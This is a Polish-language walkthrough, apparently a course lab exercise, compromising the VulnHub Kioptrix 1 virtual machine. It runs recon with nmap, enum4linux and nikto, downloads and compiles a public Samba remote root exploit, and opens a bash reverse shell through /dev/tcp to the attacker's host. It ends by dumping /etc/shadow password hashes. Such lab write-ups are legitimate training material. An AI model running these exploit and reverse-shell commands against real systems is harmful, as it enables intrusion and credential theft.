@@ -1,0 +1,1014 @@
+Zad 1
+
+Kioptrix 1 https://www.vulnhub.com/entry/kioptrix-level-1-1,22/
+
+krok zerowy - instalacja Kali linux i kioptrix w VMPlayer na maszynie windows 10 (AMD Ryzen3, płyta Aorus B550, dysk M.2)
+<0.Ustawienia poczatkowe.jpg>
+
+krok pierwszy - szukam adresu IP atakowanej maszyny (zaczynam od szukania na routerze)
+adres poszukiwany to 192.168.1.104 na podstawie analizy różnicowej (lista IP przed i po włączeniu atakowanego obrazu)
+
+
+
+
+
+rozglądamy się 
+
+sudo netdiscover -i eth0
+
+ Currently scanning: 172.24.43.0/16   |   Screen View: Unique Hosts                                                                                                                                          
+                                                                                                                                                                                                             
+ 261 Captured ARP Req/Rep packets, from 14 hosts.   Total size: 15660                                                                                                                                        
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.1.1     2c:a1:7d:81:a3:9f     67    4020  ARRIS Group, Inc.                                                                                                                                         
+ 192.168.1.98    d8:5e:d3:a1:b6:50      6     360  GIGA-BYTE TECHNOLOGY CO.,LTD.                                                                                                                             
+ 192.168.1.104   00:0c:29:3d:86:8d      9     540  VMware, Inc.                                                                                                                                              
+ 192.168.1.164   00:06:78:c3:f5:50      4     240  D&M Holdings Inc.                                                                                                                                         
+ 192.168.1.221   98:f7:d7:ff:45:eb      1      60  ARRIS Group, Inc.                                                                                                                                         
+ 192.168.1.240   74:78:27:5a:47:9a     25    1500  Dell Inc.                                                                                                                                                 
+ 192.168.1.159   d0:7f:a0:0d:be:eb      1      60  Samsung Electronics Co.,Ltd                                                                                                                               
+ 192.168.1.204   74:f9:ca:88:69:69      1      60  Nintendo Co.,Ltd                                                                                                                                          
+ 192.168.1.212   30:07:4d:39:1e:48    119    7140  SAMSUNG ELECTRO-MECHANICS(THAILAND)                                                                                                                       
+ 192.168.100.1   2c:a1:7d:81:a3:9c      1      60  ARRIS Group, Inc.                                                                                                                                         
+ 172.19.130.49   06:f7:d7:c2:63:20      2     120  Unknown vendor                                                                                                                                            
+ 89.68.148.185   2c:a1:7d:81:a3:9d     14     840  ARRIS Group, Inc.                                                                                                                                         
+ 172.19.130.1    2c:a1:7d:81:a3:9f      5     300  ARRIS Group, Inc.                                                                                                                                         
+ 10.151.130.111  2c:a1:7d:81:a3:9b      6     360  ARRIS Group, Inc.  
+
+
+
+
+dla sprawdzenia 
+nmap -sP 192.168.1.104
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-16 22:18 GMT
+Nmap scan report for 192.168.1.104
+Host is up (0.00033s latency).
+Nmap done: 1 IP address (1 host up) scanned in 0.02 seconds
+
+nmap 192.168.1.104
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-16 22:19 GMT
+Nmap scan report for 192.168.1.104
+Host is up (0.0013s latency).
+Not shown: 994 closed tcp ports (conn-refused)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+111/tcp   open  rpcbind
+139/tcp   open  netbios-ssn
+443/tcp   open  https
+32768/tcp open  filenet-tms
+
+Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds
+
+
+
+sudo nmap -p- -sV -sS -T4 -A -oX file 192.168.1.104
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-16 22:27 GMT
+Nmap scan report for 192.168.1.104
+Host is up (0.00056s latency).
+Not shown: 65529 closed tcp ports (reset)
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
+| ssh-hostkey: 
+|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
+|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
+|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
+|_sshv1: Server supports SSHv1
+80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-title: Test Page for the Apache Web Server on Red Hat Linux
+| http-methods: 
+|_  Potentially risky methods: TRACE
+111/tcp   open  rpcbind     2 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2            111/tcp   rpcbind
+|   100000  2            111/udp   rpcbind
+|   100024  1          32768/tcp   status
+|_  100024  1          32768/udp   status
+139/tcp   open  netbios-ssn Samba smbd (workgroup: xMYGROUP)
+443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_ssl-date: 2023-12-17T07:29:38+00:00; +9h01m52s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_DES_64_CBC_WITH_MD5
+|_    SSL2_RC4_64_WITH_MD5
+|_http-title: 400 Bad Request
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2009-09-26T09:32:06
+|_Not valid after:  2010-09-26T09:32:06
+|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+32768/tcp open  status      1 (RPC #100024)
+MAC Address: 00:0C:29:3D:86:8D (VMware)
+Device type: general purpose
+Running: Linux 2.4.X
+OS CPE: cpe:/o:linux:linux_kernel:2.4
+OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
+Network Distance: 1 hop
+
+Host script results:
+|_smb2-time: Protocol negotiation failed (SMB2)
+|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+|_clock-skew: 9h01m51s
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.56 ms 192.168.1.104
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.78 seconds
+
+
+
+przeglądam foldery udostępnione w Apache
+dirbuster
+
+<2.przegladamFoldery_dirbuster.jpg>
+w tym przypadku niewiele nam to daje.
+
+popartzymy na Sambę
+
+nbtscan
+
+g NBT name scan for addresses from 192.168.1.104
+
+IP address       NetBIOS Name     Server    User             MAC address      
+------------------------------------------------------------------------------
+192.168.1.104    KIOPTRIX         <server>  KIOPTRIX         00:00:00:00:00:00
+
+
+to jeszcze próba połączenia
+rpcclient -U "" 192.168.1.104
+
+Password for [WORKGROUP\]:
+rpcclient $> srvinfo
+        KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server
+        platform_id     :       500
+        os version      :       4.5
+        server type     :       0x9a03
+rpcclient $> enumdomusers
+rpcclient $> getdompwinfo 
+min_password_length: 0
+password_properties: 0x00000000
+rpcclient $> 
+
+
+przeglądamy sambę
+
+enum4linux 192.168.1.104
+
+
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Dec 16 22:53:58 2023
+
+ =========================================( Target Information )=========================================
+                                                                                                                                                                                                             
+Target ........... 192.168.1.104                                                                                                                                                                             
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ===========================( Enumerating Workgroup/Domain on 192.168.1.104 )===========================
+                                                                                                                                                                                                             
+                                                                                                                                                                                                             
+[+] Got domain/workgroup name: MYGROUP                                                                                                                                                                       
+                                                                                                                                                                                                             
+                                                                                                                                                                                                             
+ ===============================( Nbtstat Information for 192.168.1.104 )===============================
+                                                                                                                                                                                                             
+Looking up status of 192.168.1.104                                                                                                                                                                           
+        KIOPTRIX        <00> -         B <ACTIVE>  Workstation Service
+        KIOPTRIX        <03> -         B <ACTIVE>  Messenger Service
+        KIOPTRIX        <20> -         B <ACTIVE>  File Server Service
+        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+        MYGROUP         <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+        MYGROUP         <1d> -         B <ACTIVE>  Master Browser
+        MYGROUP         <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+
+        MAC Address = 00-00-00-00-00-00
+
+ ===================================( Session Check on 192.168.1.104 )===================================
+                                                                                                                                                                                                             
+                                                                                                                                                                                                             
+[+] Server 192.168.1.104 allows sessions using username '', password ''                                                                                                                                      
+                                                                                                                                                                                                             
+                                                                                                                                                                                                             
+ ================================( Getting domain SID for 192.168.1.104 )================================
+                                                                                                                                                                                                             
+Domain Name: MYGROUP                                                                                                                                                                                         
+Domain Sid: (NULL SID)
+
+[+] Can't determine if host is part of domain or part of a workgroup                                                                                                                                         
+                                                                                                                                                                                                             
+                                                                                                                                                                                                             
+ ==================================( OS information on 192.168.1.104 )==================================
+                                                                                                                                                                                                             
+                                                                                                                                                                                                             
+[E] Can't get OS info with smbclient                                                                                                                                                                         
+                                                                                                                                                                                                             
+                                                                                                                                                                                                             
+[+] Got OS info for 192.168.1.104 from srvinfo:                                                                                                                                                              
+        KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server                                                                                                                                                     
+        platform_id     :       500
+        os version      :       4.5
+        server type     :       0x9a03
+
+
+ =======================================( Users on 192.168.1.104 )=======================================
+                                                                                                                                                                                                             
+Use of uninitialized value $users in print at ./enum4linux.pl line 972.                                                                                                                                      
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.
+
+Use of uninitialized value $users in print at ./enum4linux.pl line 986.
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.
+
+ =================================( Share Enumeration on 192.168.1.104 )=================================
+                                                                                                                                                                                                             
+                                                                                                                                                                                                             
+        Sharename       Type      Comment
+        ---------       ----      -------
+        IPC$            IPC       IPC Service (Samba Server)
+        ADMIN$          IPC       IPC Service (Samba Server)
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+        KIOPTRIX             Samba Server
+
+        Workgroup            Master
+        ---------            -------
+        MYGROUP              KIOPTRIX
+
+[+] Attempting to map shares on 192.168.1.104                                                                                                                                                                
+                                                                                                                                                                                                             
+                                                                                                                                                                                                             
+[E] Can't understand response:                                                                                                                                                                               
+                                                                                                                                                                                                             
+NT_STATUS_NETWORK_ACCESS_DENIED listing \*                                                                                                                                                                   
+//192.168.1.104/IPC$    Mapping: N/A Listing: N/A Writing: N/A
+
+[E] Can't understand response:                                                                                                                                                                               
+                                                                                                                                                                                                             
+tree connect failed: NT_STATUS_WRONG_PASSWORD                                                                                                                                                                
+//192.168.1.104/ADMIN$  Mapping: N/A Listing: N/A Writing: N/A
+
+ ===========================( Password Policy Information for 192.168.1.104 )===========================
+                                                                                                                                                                                                             
+                                                                                                                                                                                                             
+[E] Unexpected error from polenum:                                                                                                                                                                           
+                                                                                                                                                                                                             
+                                                                                                                                                                                                             
+
+[+] Attaching to 192.168.1.104 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+        [!] Protocol failed: SMB SessionError: 0x5
+
+[+] Trying protocol 445/SMB...
+
+        [!] Protocol failed: [Errno Connection error (192.168.1.104:445)] [Errno 111] Connection refused
+
+
+
+[+] Retieved partial password policy with rpcclient:                                                                                                                                                         
+                                                                                                                                                                                                             
+                                                                                                                                                                                                             
+Password Complexity: Disabled                                                                                                                                                                                
+Minimum Password Length: 0
+
+
+ ======================================( Groups on 192.168.1.104 )======================================
+                                                                                                                                                                                                             
+                                                                                                                                                                                                             
+[+] Getting builtin groups:                                                                                                                                                                                  
+                                                                                                                                                                                                             
+group:[Administrators] rid:[0x220]                                                                                                                                                                           
+group:[Users] rid:[0x221]
+group:[Guests] rid:[0x222]
+group:[Power Users] rid:[0x223]
+group:[Account Operators] rid:[0x224]
+group:[System Operators] rid:[0x225]
+group:[Print Operators] rid:[0x226]
+group:[Backup Operators] rid:[0x227]
+group:[Replicator] rid:[0x228]
+
+[+]  Getting builtin group memberships:                                                                                                                                                                      
+                                                                                                                                                                                                             
+Group: Administrators' (RID: 544) has member: Couldn't find group Administrators                                                                                                                             
+Group: Print Operators' (RID: 550) has member: Couldn't find group Print Operators
+Group: Power Users' (RID: 547) has member: Couldn't find group Power Users
+Group: Account Operators' (RID: 548) has member: Couldn't find group Account Operators
+Group: Guests' (RID: 546) has member: Couldn't find group Guests
+Group: Backup Operators' (RID: 551) has member: Couldn't find group Backup Operators
+Group: Replicator' (RID: 552) has member: Couldn't find group Replicator
+Group: Users' (RID: 545) has member: Couldn't find group Users
+Group: System Operators' (RID: 549) has member: Couldn't find group System Operators
+
+[+]  Getting local groups:                                                                                                                                                                                   
+                                                                                                                                                                                                             
+group:[sys] rid:[0x3ef]                                                                                                                                                                                      
+group:[tty] rid:[0x3f3]
+group:[disk] rid:[0x3f5]
+group:[mem] rid:[0x3f9]
+group:[kmem] rid:[0x3fb]
+group:[wheel] rid:[0x3fd]
+group:[man] rid:[0x407]
+group:[dip] rid:[0x439]
+group:[lock] rid:[0x455]
+group:[users] rid:[0x4b1]
+group:[slocate] rid:[0x413]
+group:[floppy] rid:[0x40f]
+group:[utmp] rid:[0x415]
+
+[+]  Getting local group memberships:                                                                                                                                                                        
+                                                                                                                                                                                                             
+                                                                                                                                                                                                             
+[+]  Getting domain groups:                                                                                                                                                                                  
+                                                                                                                                                                                                             
+group:[Domain Admins] rid:[0x200]                                                                                                                                                                            
+group:[Domain Users] rid:[0x201]
+
+[+]  Getting domain group memberships:                                                                                                                                                                       
+                                                                                                                                                                                                             
+Group: 'Domain Users' (RID: 513) has member: Couldn't find group Domain Users                                                                                                                                
+Group: 'Domain Admins' (RID: 512) has member: Couldn't find group Domain Admins
+
+ ==================( Users on 192.168.1.104 via RID cycling (RIDS: 500-550,1000-1050) )==================
+                                                                                                                                                                                                             
+                                                                                                                                                                                                             
+[I] Found new SID:                                                                                                                                                                                           
+S-1-5-21-4157223341-3243572438-1405127623                                                                                                                                                                    
+
+[+] Enumerating users using SID S-1-5-21-4157223341-3243572438-1405127623 and logon username '', password ''                                                                                                 
+                                                                                                                                                                                                             
+S-1-5-21-4157223341-3243572438-1405127623-502 KIOPTRIX\unix_group.2147483399 (Local Group)                                                                                                                   
+S-1-5-21-4157223341-3243572438-1405127623-503 KIOPTRIX\unix_group.2147483399 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-504 KIOPTRIX\unix_group.2147483400 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-505 KIOPTRIX\unix_group.2147483400 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-506 KIOPTRIX\unix_group.2147483401 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-507 KIOPTRIX\unix_group.2147483401 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-508 KIOPTRIX\unix_group.2147483402 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-509 KIOPTRIX\unix_group.2147483402 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-510 KIOPTRIX\unix_group.2147483403 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-511 KIOPTRIX\unix_group.2147483403 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-512 KIOPTRIX\Domain Admins (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-513 KIOPTRIX\Domain Users (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-514 KIOPTRIX\Domain Guests (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-515 KIOPTRIX\unix_group.2147483405 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-516 KIOPTRIX\unix_group.2147483406 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-517 KIOPTRIX\unix_group.2147483406 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-518 KIOPTRIX\unix_group.2147483407 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-519 KIOPTRIX\unix_group.2147483407 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-520 KIOPTRIX\unix_group.2147483408 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-521 KIOPTRIX\unix_group.2147483408 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-522 KIOPTRIX\unix_group.2147483409 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-523 KIOPTRIX\unix_group.2147483409 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-524 KIOPTRIX\unix_group.2147483410 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-525 KIOPTRIX\unix_group.2147483410 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-526 KIOPTRIX\unix_group.2147483411 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-527 KIOPTRIX\unix_group.2147483411 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-528 KIOPTRIX\unix_group.2147483412 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-529 KIOPTRIX\unix_group.2147483412 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-530 KIOPTRIX\unix_group.2147483413 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-531 KIOPTRIX\unix_group.2147483413 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-532 KIOPTRIX\unix_group.2147483414 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-533 KIOPTRIX\unix_group.2147483414 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-534 KIOPTRIX\unix_group.2147483415 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-535 KIOPTRIX\unix_group.2147483415 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-536 KIOPTRIX\unix_group.2147483416 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-537 KIOPTRIX\unix_group.2147483416 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-538 KIOPTRIX\unix_group.2147483417 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-539 KIOPTRIX\unix_group.2147483417 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-540 KIOPTRIX\unix_group.2147483418 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-541 KIOPTRIX\unix_group.2147483418 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-542 KIOPTRIX\unix_group.2147483419 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-543 KIOPTRIX\unix_group.2147483419 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-544 KIOPTRIX\unix_group.2147483420 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-545 KIOPTRIX\unix_group.2147483420 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-546 KIOPTRIX\unix_group.2147483421 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-547 KIOPTRIX\unix_group.2147483421 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-548 KIOPTRIX\unix_group.2147483422 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-549 KIOPTRIX\unix_group.2147483422 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-550 KIOPTRIX\unix_group.2147483423 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1000 KIOPTRIX\root (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1001 KIOPTRIX\root (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1002 KIOPTRIX\bin (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1003 KIOPTRIX\bin (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1004 KIOPTRIX\daemon (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1005 KIOPTRIX\daemon (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1006 KIOPTRIX\adm (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1007 KIOPTRIX\sys (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1008 KIOPTRIX\lp (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1009 KIOPTRIX\adm (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1010 KIOPTRIX\sync (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1011 KIOPTRIX\tty (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1012 KIOPTRIX\shutdown (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1013 KIOPTRIX\disk (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1014 KIOPTRIX\halt (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1015 KIOPTRIX\lp (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1016 KIOPTRIX\mail (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1017 KIOPTRIX\mem (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1018 KIOPTRIX\news (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1019 KIOPTRIX\kmem (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1020 KIOPTRIX\uucp (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1021 KIOPTRIX\wheel (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1022 KIOPTRIX\operator (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1023 KIOPTRIX\unix_group.11 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1024 KIOPTRIX\games (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1025 KIOPTRIX\mail (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1026 KIOPTRIX\gopher (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1027 KIOPTRIX\news (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1028 KIOPTRIX\ftp (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1029 KIOPTRIX\uucp (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1030 KIOPTRIX\unix_user.15 (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1031 KIOPTRIX\man (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1032 KIOPTRIX\unix_user.16 (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1033 KIOPTRIX\unix_group.16 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1034 KIOPTRIX\unix_user.17 (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1035 KIOPTRIX\unix_group.17 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1036 KIOPTRIX\unix_user.18 (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1037 KIOPTRIX\unix_group.18 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1038 KIOPTRIX\unix_user.19 (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1039 KIOPTRIX\floppy (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1040 KIOPTRIX\unix_user.20 (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1041 KIOPTRIX\games (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1042 KIOPTRIX\unix_user.21 (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1043 KIOPTRIX\slocate (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1044 KIOPTRIX\unix_user.22 (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1045 KIOPTRIX\utmp (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1046 KIOPTRIX\squid (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1047 KIOPTRIX\squid (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1048 KIOPTRIX\unix_user.24 (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1049 KIOPTRIX\unix_group.24 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1050 KIOPTRIX\unix_user.25 (Local User)
+
+ ===============================( Getting printer info for 192.168.1.104 )===============================
+                                                                                                                                                            
+No printers returned.                                                                                                                                       
+
+
+enum4linux complete on Sat Dec 16 22:54:05 2023
+
+
+
+szukam exploita dla samba 2.2.1a
+
+https://www.exploit-db.com/exploits/10
+
+wget -O samba-exploit.c https://www.exploit-db.com/download/10
+
+┌──(john㉿kali)-[~/exploit]
+└─$ wget -O samba-exploit.c https://www.exploit-db.com/download/10
+--2023-12-16 23:35:41--  https://www.exploit-db.com/download/10
+Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
+Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [application/txt]
+Saving to: 'samba-exploit.c'
+
+samba-exploit.c                            [ <=>                                                                         ]  44.06K   253KB/s    in 0.2s    
+
+2023-12-16 23:35:42 (253 KB/s) - 'samba-exploit.c' saved [45115]
+
+
+kompilacja:
+
+gcc samba-exploit.c -o samba2.2.1a-exploit
+
+
+samba-exploit.c
+                                                                                                                                                            
+┌──(john㉿kali)-[~/exploit]
+└─$ gcc samba-exploit.c -o samba2.2.1a-exploit
+                                                                                                                                                            
+┌──(john㉿kali)-[~/exploit]
+└─$ ls
+samba-exploit.c  samba2.2.1a-exploit
+
+
+└─$ ./samba2.2.1a-exploit 
+samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
+--------------------------------------------------------------
+Usage: ./samba2.2.1a-exploit [-bBcCdfprsStv] [host]
+
+-b <platform>   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)
+-B <step>       bruteforce steps (default = 300)
+-c <ip address> connectback ip address
+-C <max childs> max childs for scan/bruteforce mode (default = 40)
+-d <delay>      bruteforce/scanmode delay in micro seconds (default = 100000)
+-f              force
+-p <port>       port to attack (default = 139)
+-r <ret>        return address
+-s              scan mode (random)
+-S <network>    scan mode
+-t <type>       presets (0 for a list)
+-v              verbose mode
+
+└─$  ./samba2.2.1a-exploit 192.168.1.104 -c 192.168.1.31 -b 0
+
+samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
+--------------------------------------------------------------
++ Bruteforce mode. (Linux)
++ Host is running samba.
++ Worked!
+--------------------------------------------------------------
+*** JE MOET JE MUIL HOUWE
+Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
+uid=0(root) gid=0(root) groups=99(nobody)
+
+
+
+nasłuchuje na porcie 4444
+nc -nlvp 4444
+
+
+uruchamiam zdalną powłokę
+bash -i >& /dev/tcp/192.168.1.31/4444 0>&1
+
+
+
+cat shadow
+root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::
+bin:*:14513:0:99999:7:::
+daemon:*:14513:0:99999:7:::
+adm:*:14513:0:99999:7:::
+lp:*:14513:0:99999:7:::
+sync:*:14513:0:99999:7:::
+shutdown:*:14513:0:99999:7:::
+halt:*:14513:0:99999:7:::
+mail:*:14513:0:99999:7:::
+news:*:14513:0:99999:7:::
+uucp:*:14513:0:99999:7:::
+operator:*:14513:0:99999:7:::
+games:*:14513:0:99999:7:::
+gopher:*:14513:0:99999:7:::
+ftp:*:14513:0:99999:7:::
+nobody:*:14513:0:99999:7:::
+mailnull:!!:14513:0:99999:7:::
+rpm:!!:14513:0:99999:7:::
+xfs:!!:14513:0:99999:7:::
+rpc:!!:14513:0:99999:7:::
+rpcuser:!!:14513:0:99999:7:::
+nfsnobody:!!:14513:0:99999:7:::
+nscd:!!:14513:0:99999:7:::
+ident:!!:14513:0:99999:7:::
+radvd:!!:14513:0:99999:7:::
+postgres:!!:14513:0:99999:7:::
+apache:!!:14513:0:99999:7:::
+squid:!!:14513:0:99999:7:::
+pcap:!!:14513:0:99999:7:::
+john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::
+harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::
+
+
+
+--- version 2
+
+$ nikto -host 192.168.1.104 
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.104
++ Target Hostname:    192.168.1.104
++ Target Port:        80
++ Start Time:         2023-12-17 00:04:19 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
++ /: Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Thu Sep  6 04:12:46 2001. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /: Apache is vulnerable to XSS via the Expect header. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3918
++ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ OpenSSL/0.9.6b appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
++ mod_ssl/2.8.4 appears to be outdated (current is at least 2.9.6) (may depend on server version).
